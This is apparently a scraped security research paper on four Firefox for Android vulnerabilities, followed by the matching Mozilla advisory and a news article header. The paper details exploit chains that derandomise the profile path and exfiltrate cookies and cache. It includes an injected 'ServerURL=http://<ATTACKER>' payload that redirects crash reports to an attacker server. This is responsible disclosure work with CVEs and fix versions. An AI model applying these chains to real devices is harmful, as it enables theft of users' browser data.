  far from the ideal 41.36 random bits (log2 368
  ) and
  can be predicted by the adversary as we will see
  next.
  B. Proﬁle Directory Name Leaks to Android System
  Log
  The random Proﬁle Directory Name is written to
  the Android System Log (logcat) in various locations.
  For instance, upon Firefox launch, the following data
  is written:
  D/GeckoProfile( 4766): Found profile dir:
  /data/data/.../files/mozilla/24pd90uh.default
  In Android 4.0 and below, the Android log can easily
  be read by all applications including malicious ones
  by acquiring the READ\_LOGS permission. Android 4.1
  has introduced a change to this behavior to prevent
  such log leakage attacks: the READ\_LOGS permission
  is no longer required, however applications can only
  listen to their own log. In section IV-B we show how
  a malicious app can manipulate Firefox to leak its
  own private log in order to overcome this obstacle.
  3https://android.googlesource.com/platform/dalvik.git/+/
  android-4.4 r1.2/vm/Sync.cpp
* 3. [3
  C. Automatic File](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#3)  Download to SD Card
  Any ﬁle which cannot be rendered by Fire-
  fox is automatically downloaded to the SD card
  (/mnt/sdcard/Download), a folder which can be
  read by a malicious application by acquiring the
  READ\_EXTERNAL\_STORAGE permission. Interestingly,
  this permission was not even enforced before Android
  4.44
  . This allows a malicious application to extract
  non-renderable data such as the cookies database,
  once it has managed to derandomize the proﬁle
  directory name.
  D. Crash Reporter File Manipulation
  The org.mozilla.gecko.CrashReporter class is
  a public activity. Its purpose is to send crash dumps
  to Mozilla when needed (Figure III.3). The CrashRe-
  porter activity receives the dump ﬁle path as an
  input (an Intent extra parameter). When the activity
  is launched, its onCreate method (Figure III.4) is
  executed and the following actions take place:
  1) Using the moveFile (Figure III.5) method, the
  given minidump ﬁle is moved to the pending
  minidumps path, files/mozilla/Crash Re-
  ports/pending.
  2) A meta-data ﬁlename is deduced from the given
  minidump ﬁle path, by replacing all ’.dmp’
  occurrences with ’.extra’. i.e. <filename>.dmp
  becomes <filename>.extra.
  3) The meta-data ﬁle is moved to the pending
  minidumps path using the moveFile method.
  4) The meta-data ﬁle is parsed as a key/value ﬁle
  format (Figure III.6). The target server URL
  (i.e. the one that the crash information is sent
  to) is speciﬁed here using the ServerURL key.
  5) The crash dialog is presented to the user (Fig-
  ure III.3).
  If the user presses the Close or Restart buttons with
  the Send report check-box enabled, the minidump
  alongside with other sensitive information is sent
  to the speciﬁed server by calling the sendReport
  method. It should be noted that if the user has
  also checked the Include the address check-box, then
  Android logs are sent as well.
  The CrashReporter activity consumes the
  minidump path from the input intent (Figure III.4,
  Line 4) although it should be considered untrusted
  data since the activity is public as deﬁned in
  the Android Manifest ﬁle. Therefore, a malicious
  application can control the source path of the
  moved minidump ﬁle and the deduced extra ﬁle
  4http://developer.android.com/reference/android/
  Manifest.permission.html#READ EXTERNAL STORAGE
  Figure III.3. Crash Reporter dialog
  (Figure III.4, Lines 8, 11). We will see in the next
  section that this allows that attacker to control the
  destination server for the crash report, hence the
  response value used as a ﬁle path in Figure III.7,
  Line 19 should be untrusted as well.
  IV. Exploitation
  The attacker (by the use of a malicious appli-
  cation) can exploit a subset of the aforementioned
  vulnerabilities in order to:
  1) Derandomize the proﬁle directory path.
  2) Exﬁltrate sensitive data (such as cookies and
  cached information) from the proﬁle directory.
  In this section we describe several attractive exploita-
  tion suites.
  A. Suite I: Exploiting Vulnerabilities III-A, III-C and
  optionally III-D
  1) Derandomizing the Proﬁle Path: Let Y be the
  seed chosen by Firefox. The goal of the attacker is to
  derandomize it by recording some value which shares
  a strong relation with it. Both the VA and the time
  parts of the seed cannot be entirely determined by
  the attacker, however, most of their bits can be leaked
  to the attacker using simple actions:
  a) Derandomizing the VA Value: To obtain
  parts of the VA, as per the ineﬀective ASLR, the
  attacker can query its own process using the Sys-
  tem.identitiyHashCode routine on some object.
* 4. [4
  b) Derandomizing the](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#4)  Time Value: The ms
  time value can be leaked in two diﬀerent ways.
  First, if Firefox had been installed after the ma-
  licious app, the latter can record the ﬁrst Firefox
  run by simply monitoring the device’s process list.
  Otherwise, the attacker app can exploit Vulnera-
  bility III-D to move the profiles.ini ﬁle (which
  has a deterministic path) to the diﬀerent direc-
  tory. The exploitation is done by sending an Intent
  to the Crash Reporter with minidumpPath Intent
  extra set to /data/data/org.mozilla.firefox/-
  files/mozilla/profiles.ini. Firefox will create a
  new proﬁle on its next run, which can be forced by
  crashing it (this can be done by exploiting Vulnera-
  bility III-D, sending an Intent to the Crash Reporter
  without a minidumpPath extra). Again the attacker
  can record the Firefox launch time.
  Let X be the attacker’s inaccurate sample where
  X = V A + MeasuredTime. Let ε be the error,
  i.e. ε = Y − X. In our brute-force attack we try
  values in the order of their inferred probabilities
  which can be computed oﬄine by the attacker (see
  Section V). Let N be the number of attempts until
  a success, then the expected number of attempts is
  E(N) =
  n
  k=1 k·p(k) where {p(k)}n
  k=1 are the ordered
  inferred probabilities (p(1) ≥ p(2) ≥ · · · ≥ p(n)).
  Please note that the expression for E(N) proves
  that this is the optimal search algorithm (in terms
  of the expectation). A simpler model is to assume
  that ε is a (discrete) bell-curve with the center
  estimated by ¯ε = ¯x-¯y. It can be shown that E(N) =
  O(E|X − EX|) = O (σε) so a more narrow bell-
  curve yields a shorter attack time (on average). By
  using the inferred probabilities of ε and the sampled
  seed, X, the attacker creates a list of proﬁle names
  by mimicking the GeckoProfile.saltProfileName
  implementation (this computation can be also done
  oﬀ the device and downloaded from the attacker).
  2) Data Exﬁltration: This phase is online. The
  attacker creates a specially crafted world-readable
  HTML ﬁle and commands Firefox to load it (by using
  an Intent). This ﬁle includes the list of proﬁle names
  ordered by their probabilities generated previously.
  The JavaScript code in the HTML ﬁle goes over the
  list, searching for the correct proﬁle. When there is
  a match, it can download any ﬁle under the proﬁles
  directory by creating an iframe targeting the ﬁle-
  name. As per Vulnerability III-C, if Firefox cannot
  render the ﬁle, it will automatically download the ﬁle
  to the SD card (/mnt/sdcard/Download), a folder
  which can be read by the attacker.
  B. Suite II: Exploiting Vulnerabilities III-B, III-C
  and optionally III-D
  1) Derandomizing the Proﬁle Path : On Android
  4.0 and below, the Android System Log can easily be
  read by the malicious app. This allows the malicious
  app to exploit Vulnerability III-B and deduce the
  proﬁle directory path.
  Android 4.1 prevents this attack as applications
  can only listen to their own logs. Since Firefox sends
  its own private log alongside the crash report (see
  Section III-D) , Vulnerability III-D can be exploited
  for sending the logs to the attacker:
  • The malicious app creates two world
  readable ﬁles under its data directory:
  /data/data/<malicious app>/foo.dmp with
  an arbitrary content (can be left empty) and
  /data/data/<malicious app>/foo.extra
  which contains the attacker’s server,
  ServerURL=http://<attacker>/.
  • The malicious app generates an Intent ob-
  ject which targets the CrashReporter activity
  with a minidumpPath parameter set to /data/-
  data/<malicious app>/foo.dmp
  After the above actions take place, according to the
  operation of the CrashReporter activity (see Section
  III-D), Firefox will move foo.dmp and foo.extra
  from the malicious app data directory to the Fire-
  fox crash reports pending path and then parse
  foo.extra for key-value pairs. Since the extra ﬁle
  now contains the attacker’s IP as the ServerURL, if
  the user pressed one of the buttons on the CrashRe-
  porter dialog, Firefox would send the crash report
  to the attacker. If the user has also checked the
  Include the address check-box, then Firefox would
  also append the Android Log output, which contains
  the Firefox private logs that include the random
  proﬁle directory name. It should be noted that since
  Firefox only sends a 200 lines window of the log, the
  leaked path can be out of that window since it is
  logged upon Firefox’s launch. In order to make sure
  that the path is within the window, the attacker can
  restart Firefox by crashing it. This can be easily done
  by invoking the CrashReporter activity without a
  minidumpPath parameter.
  2) Data Exﬁltration: Once the attacker has learnt
  the proﬁle path, he can leak ﬁles by exploiting Vul-
  nerability III-C. The attacker simply invokes Firefox
  using an Intent with a payload set to the target ﬁle
  path.
  C. Suite III: Exploiting Vulnerabilities III-B and
  III-D
  1) Derandomizing the Proﬁle Path Seed: This part
  is exactly as described in Section IV-B1.
* 5. [5
  2) Data Exﬁltration:](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#5)  Here we exploit
  Vulnerability III-D. We indirectly inject the
  ServerURL=http://<attacker> string to the target
  ﬁle and trick Firefox to use this ﬁle as the minidump
  extra. For instance, by using this method, the
  attacker can leak the cache. First, he opens Firefox
  (using an Intent) on an attacker’s controlled website,
  which contains the above string in its HTML body
  (Figure IV.1). After the cache has been prepared,
  the attacker can leak it by generating another Intent
  that targets the CrashReporter activity, with the
  minidump path parameter set to the cache ﬁle. Since
  the cache ﬁle path has no ’.dmp’ substring, the
  computed extra ﬁle will be the same, and the target
  server URL will be parsed out of the cache ﬁle.
  1 <HTML>
  2 <BODY>
  3 ServerURL=http : //<ATTACKER>
  4 </BODY>
  5 </HTML>
  Figure IV.1. Injected payload into Firefox’s cache
  V. Evaluation
  We tested our Suite I exploit on Firefox 25.0.1
  running on Samsung GT-I9500 Galaxy S4 device
  equipped with Android 4.2.2. In order to infer the
  probabilities of ε we ran 404 independent runs of the
  following test:
  1) Call Math.Random() and retrieve its identi-
  tyHashCode (Figure V.1)
  2) Start monitoring the process list in a frequency
  of 20 Hz for recording the Firefox launch time.
  3) Remove the profiles.ini ﬁle from the Firefox
  directory by exploiting Vulnerability III-D.
  4) Record the created proﬁle directory.
  5) Kill Firefox.
  6) Restart Firefox.
  7) Print the needed values.
  1 Math . random ( ) ;
  2 Field f = Math . class .
  3 getDeclaredField ( ”random ” ) ;
  4 f . s e t A c c e s s i b l e ( true ) ;
  5 Random r = (Random) f . get ( null ) ;
  6 Long addr = System . identityHashCode ( r ) ;
  Figure V.1. Retrieving the identityHashCode of the Math
  inner Random object
  For example, for each run we received and recorded
  the following data:
  Sampled VA: 42dc6cd8
  Sampled Time: 1385337348079
  Sampled Seed: 142cf66ccc7
  Created profile: xa1x453r.default
  Later we calculated the real seed and ε by an oﬄine
  brute-force. For example, for the data above, the real
  seed is 1386459232784 and ε = 142665.
  We witnessed three strong linear correlations be-
  tween Y and X (Figure V.2). We believe that the
  reason for the less dense lines rely on Dalvik Heap
  internals which caused the oﬀset to ’jump’ with a
  ﬁxed number for a few tests (i.e. the probability for
  this to happen is low).
  Ϭ
  ϮϬϬϬϬϬϬ
  ϰϬϬϬϬϬϬ
  ϲϬϬϬϬϬϬ
  ϴϬϬϬϬϬϬ
  ϭϬϬϬϬϬϬϬ
  ϭϮϬϬϬϬϬϬ
  ϭϰϬϬϬϬϬϬ
  ϭϲϬϬϬϬϬϬ
  Ϭ ϮϬϬϬϬϬϬ ϰϬϬϬϬϬϬ ϲϬϬϬϬϬϬ ϴϬϬϬϬϬϬ ϭϬϬϬϬϬϬϬ ϭϮϬϬϬϬϬϬ ϭϰϬϬϬϬϬϬ
  Figure V.2. Linear correlation between the real seed and the
  sampled one
  We created a histogram for inferring the distribu-
  tion of ε (Figure V.3) and calculated the expected
  number of attempts, E(N), which is 152779.65 and
  is equivalent to 17.22 bits. Note that the Shannon
  entropy is very close, 18.63 bits. We’ve got an entropy
  which is much lower than the ideal 64 bits (the java
  long primitive size) seed entropy, thus the attack is
  feasible.
  Ϭ
  Ϭ͘ϬϮ
  Ϭ͘Ϭϰ
  Ϭ͘Ϭϲ
  Ϭ͘Ϭϴ
  Ϭ͘ϭ
  Ϭ͘ϭϮ
  Ϭ͘ϭϰ
  ͲϭϬϬϬϬϬ ϮϬϬϬϬϬ ϱϬϬϬϬϬ ϴϬϬϬϬϬ ϭϭϬϬϬϬϬ ϭϰϬϬϬϬϬ ϭϳϬϬϬϬϬ
  Figure V.3. ε Histogram
  We then adhered to the steps of section IV-A,
  taken the simpler approach where we assert a sym-
  metric bell curve. Since we received three linear
* 6. [6
  correlations, we have](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#6)  taken a slightly diﬀerent ap-
  proach. We denote p1, p2, p3 as the probabilities for
  the error to be taken from each curve and assert that
  each error is normally distributed with its respective
  variance (the actual discrete error is the rounded
  value, see Figure V.4). Therefore ε1 ∼ N 0, σ2
  1 with
  probability p1 , ε2 ∼ N 0, σ2
  2 with probability p2
  and ε3 ∼ N 0, σ2
  3 with probability p3. We brute-
  force in the order of the probabilities. We ran our
  exploit and successfully caused Firefox to download
  sensitive ﬁles into the SD card which can be read by
  the attacker (Figure V.5). It should be noted that
  according to the ’normalized’ model, the expected
  number of tries is 214373.3 which is equivalent to
  17.709 bits.
  Ϭ
  Ϭ͘ϬϮ
  Ϭ͘Ϭϰ
  Ϭ͘Ϭϲ
  Ϭ͘Ϭϴ
  Ϭ͘ϭ
  Ϭ͘ϭϮ
  ͲϭϬϬϬϬϬ ϮϬϬϬϬϬ ϱϬϬϬϬϬ ϴϬϬϬϬϬ ϭϭϬϬϬϬϬ ϭϰϬϬϬϬϬ ϭϳϬϬϬϬϬ
  Figure V.4. Normalized−ε histogram
  VI. Identifiers & Fix Versions
  Vulnerability CVE ID Fix Version
  III-A CVE-2014-1516 TBA5
  III-B CVE-2014-1484 Firefox 27
  III-C CVE-2014-1515 Firefox 28.0.1
  III-D CVE-2014-1506 Firefox 28
  VII. Disclosure Timeline
  03/25/2014 Public disclosure.
  03/25/2014 Firefox 28.0.1 is released, ﬁxing
  Vulnerability III-C
  03/18/2014 Firefox 28 is released, ﬁxing
  Vulnerability III-D
  03/15/2014 Permission granted.
  03/12/2014 Requested permission to disclose
  Vulnerability III-A despite lack of ﬁx.
  02/04/2014 Firefox 27 is released, ﬁxing
  Vulnerability III-B
  11/28/2013 Reported Vulnerabilities.
  5As its severity is now much lower with the CVE-2014-1515
  ﬁx, we were allowed by Mozilla to publicly disclose this unﬁxed
  vulnerability.
  Figure V.5. Automatic File Download (exploiting Vulnerabil-
  ity III-C)
  References
  [1] Activity class reference. http://developer.android.com/
  reference/android/app/Activity.html.
  [2] Service class reference. http://developer.android.com/
  reference/android/app/Service.html.
  [3] Bundle class reference. http://developer.android.com/
  reference/android/os/Bundle.html.
  [4] Byoungyoung Lee, Long Lu, Tielei Wang, Taesoo Kim, and
  Wenke Lee. From Zygote to Morula: Fortifying Weakened
  ASLR on Android. In IEEE Symposium on Security and
  Privacy, 2014.
  [5] Jon Oberheide. A look at ASLR in An-
  droid Ice Cream Sandwich 4.0, February
  2012. https://www.duosecurity.com/blog/
  a-look-at-aslr-in-android-ice-cream-sandwich-4-0.
* 7. [7
  1 @Override
  2 public](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#7)  void onCreate ( Bundle savedInstanceState ) {
  3 . . .
  4 String passedMinidumpPath = getIntent ( ) . getStringExtra (PASSED MINI DUMP KEY) ;
  5 F i l e passedMinidumpFile = new F i l e ( passedMinidumpPath ) ;
  6 F i l e pendingDir = new F i l e ( g e t F i l e s D i r ( ) , PENDING SUFFIX) ;
  7 pendingDir . mkdirs ( ) ;
  8 mPendingMinidumpFile = new F i l e ( pendingDir , passedMinidumpFile . getName ( ) ) ;
  9 moveFile ( passedMinidumpFile , mPendingMinidumpFile ) ;
  10 F i l e e x t r a s F i l e = new F i l e ( passedMinidumpPath . r e p l a c e A l l ( ” .dmp” , ” . extra ” ) ) ;
  11 mPendingExtrasFile = new F i l e ( pendingDir , e x t r a s F i l e . getName ( ) ) ;
  12 moveFile ( extrasFile , mPendingExtrasFile ) ;
  13 mExtrasStringMap = new HashMap<String , String >();
  14 readStringsFromFile ( mPendingExtrasFile . getPath ( ) , mExtrasStringMap ) ;
  15 . . .
  16 }
  Figure III.4. onCreate method under CrashReporter
  1 private boolean moveFile ( F i l e inFile , F i l e outFile ) {
  2 Log . i (LOGTAG, ”moving ” + i n F i l e + ” to ” + outFile ) ;
  3 i f ( i n F i l e . renameTo ( outFile ))
  4 return true ;
  5 try {
  6 outFile . createNewFile ( ) ;
  7 Log . i (LOGTAG, ”couldn ’ t rename minidump f i l e ” ) ;
  8 // so copy i t instead
  9 FileChannel inChannel = new FileInputStream ( i n F i l e ) . getChannel ( ) ;
  10 FileChannel outChannel = new FileOutputStream ( outFile ) . getChannel ( ) ;
  11 long t r a n s f e r r e d = inChannel . transferTo (0 , inChannel . s i z e ( ) , outChannel ) ;
  12 inChannel . c l o s e ( ) ;
  13 outChannel . c l o s e ( ) ; pr i or to
  14 i f ( t r a n s f e r r e d > 0)
  15 i n F i l e . d e l e t e ( ) ;
  16 } catch ( Exception e ) {
  17 Log . e (LOGTAG, ”exception while copying minidump f i l e : ” , e ) ;
  18 return false ;
  19 }
  20 return true ;
  21 }
  Figure III.5. moveFile method under CrashReporter
* 8. [8
  1 private boolean](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#8)  readStringsFromFile ( String filePath , Map<String , String> stringMap ) {
  2 try {
  3 BufferedReader reader = new BufferedReader (new FileReader ( f i l e P a t h ) ) ;
  4 return readStringsFromReader ( reader , stringMap ) ;
  5 } catch ( Exception e ) {
  6 Log . e (LOGTAG, ”exception while reading s t r i n g s : ” , e ) ;
  7 return false ;
  8 }
  9 }
  10
  11 private boolean readStringsFromReader ( BufferedReader reader , Map<String , String> stringMap )
  12 throws IOException {
  13 String l i n e ;
  14 while (( l i n e = reader . readLine ( ) ) != null ) {
  15 int equalsPos = −1;
  16 i f (( equalsPos = l i n e . indexOf ( ’=’ )) != −1) {
  17 String key = l i n e . substring (0 , equalsPos ) ;
  18 String val = unescape ( l i n e . substring ( equalsPos + 1 ) ) ;
  19 stringMap . put ( key , val ) ;
  20 }
  21 }
  22 reader . c l o s e ( ) ;
  23 return true ;
  24 }
  Figure III.6. File parsing under CrashReporter
  1 private void sendReport ( F i l e minidumpFile , Map<String , String> extras , F i l e e x t r a s F i l e ) {
  2 final CheckBox includeURLCheckbox = ( CheckBox ) findViewById (R. id . i n c l u d e u r l ) ;
  3 String spec = extras . get (SERVER URL KEY) ;
  4 . . .
  5 try {
  6 URL url = new URL( spec ) ;
  7 HttpURLConnection conn = ( HttpURLConnection ) url . openConnection ( ) ;
  8 . . .
  9 i f ( Build .VERSION.SDK INT >= 16 && includeURLCheckbox . isChecked ( ) ) {
  10 sendPart ( os , boundary , ”Android Logcat ” , readLogcat ( ) ) ;
  11 }
  12 . . .
  13 sendFile ( os , boundary , MINI DUMP PATH KEY, minidumpFile ) ;
  14 . . .
  15 i f ( conn . getResponseCode () == HttpURLConnection .HTTP OK) {
  16 F i l e submittedDir = new F i l e ( g e t F i l e s D i r ( ) , SUBMITTED SUFFIX) ;
  17 . . .
  18 String crashid = responseMap . get ( ”CrashID ” ) ;
  19 F i l e f i l e = new F i l e ( submittedDir , crashid + ” . txt ” ) ;
  20 FileOutputStream f o s = new FileOutputStream ( f i l e ) ;
  21 f o s . write ( ”Crash ID : ” . getBytes ( ) ) ;
  22 f o s . write ( crashid . getBytes ( ) ) ;
  23 f o s . c l o s e ( ) ;
  24 }
  25 . . .
  26 }
  27 . . .
  28 }
  Figure III.7. sendReport under CrashReporter
Download[About](/about)[Support](https://support.scribd.com/hc/en/categories/360004792932-SlideShare?userType=SlideShare)[Terms](https://support.scribd.com/hc/en/articles/210129326-General-Terms-of-Use)[Privacy](https://support.scribd.com/hc/en/articles/210129366-Privacy-policy)[Copyright](/copyright-policy)Cookie Preferences[Do not sell or share my personal information](https://support.scribd.com/hc/en-us/articles/360038016931-Privacy-Rights-Request-Form)[Everand](https://www.everand.com)

---

© 2025 SlideShare from Scribd

=== Content from www.mozilla.org_3a29f926_20250126_073737.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2014-33

## File: protocol links downloaded to SD card by default

Announced
March 25, 2014
Reporter
Roee Hay
Impact
High
Products
Firefox
Fixed in

* Firefox 28.0.1

### Description

Security researcher **Roee Hay** reported that a hyperlink using
the `file:` protocol on Firefox for Android could link to a local
file in the Firefox profile directory. If a user selected this link on their
device, the linked file would be copied to the SD card without prompting.
This SD card location is world readable leading to a potential information
disclosure of files in the Firefox profile through a malicious application.

### References

* [Do not handle file: paths by downloading them](https://bugzilla.mozilla.org/show_bug.cgi?id=945429) ([CVE-2014-1515](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1515))

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from securityintelligence.com_8c66ea0c_20250125_084606.html ===


[###### Security Intelligence](https://securityintelligence.com "Security Intelligence")

[News](/news/)
[Topics](/category/topics/)
[X-Force](/x-force/)
[Podcast](/media/)

News
Topics
Threat Research
Podcast

Search

{{#articles}}
[### {{title}}](%7B%7Bpermalink%7D%7D)

{{/articles}}

[View All News](/news/)

[Application Security](/category/app-security/)
[Artificial Intelligence](/category/artificial-intelligence/)
[CISO](/category/ciso-corner/)
[Cloud Security](/category/cloud-protection/)
[Data Protection](/category/data-protection/)
[Endpoint](/category/endpoint/)

[Fraud Protection](/category/fraud-protection/)
[Identity & Access](/category/identity-access/)
[Incident Response](/category/incident-response/)
[Mainframe](/category/mainframe/)
[Network](/category/network/)
[Risk Management](/category/risk-management/)

[Intelligence & Analytics](/category/security-intelligence-analytics/)
[Security Services](/category/security-services/)
[Threat Hunting](/category/threat-hunting/)
[Zero Trust](/category/topics/zero-trust/)
[Infographic: Zero trust policy](/infographic-zero-trust-policy/)

Industries
[Banking & Finance](/category/banking-financial-services-industry/)
[Energy & Utility](/category/energy-utility-industry/)
[Government](/category/government/)
[Healthcare](/category/health-care-industry/)

[View All Topics](/category/topics/)

{{#articles}}
[### {{title}}](%7B%7Bpermalink%7D%7D)

{{/articles}}

[View More From X-Force](/x-force/)

{{#articles}}
[### {{title}}](%7B%7Bpermalink%7D%7D)

{{/articles}}

[View All Episodes](/media/)

[News](/news/)

## Topics

[All Categories](/category/topics/)
[Application Security](/category/app-security/)
[Identity & Access](/category/identity-access/)
[Artificial Intelligence](/category/artificial-intelligence/)
[Incident Response](/category/incident-response/)
[CISO](/category/ciso-corner/)
[Mainframe](/category/mainframe/)
[Cloud Security](/category/cloud-protection/)
[Mobile Security](/category/mobile-security-podcasts/)
[Data Protection](/category/data-protection/)
[Network](/category/network/)
[Endpoint](/category/endpoint/)
[Risk Management](/category/risk-management/)
[Fraud Protection](/category/fraud-protection/)
[Threat Hunting](/category/threat-hunting/)
[Security Services](/category/security-services/)
[Security Intelligence & Analytics](/category/security-intelligence-analytics/)

Industries
[Banking & Finance](/category/industries/banking-financial-services-industry/)
[Energy & Utility](/category/energy-utility-industry/)
[Government](/category/government/)
[Healthcare](/category/health-care-industry/)

[X-Force](/x-force/)
[Podcast](/media/)

# New Vulnerabilities in Firefox for Android: Overtaking Firefox Profiles

Light
Dark

---

March 26, 2014
By [Roee Hay](https://securityintelligence.com/author/roee-hay/)

  8 min read

---

[Application Security

[Endpoint

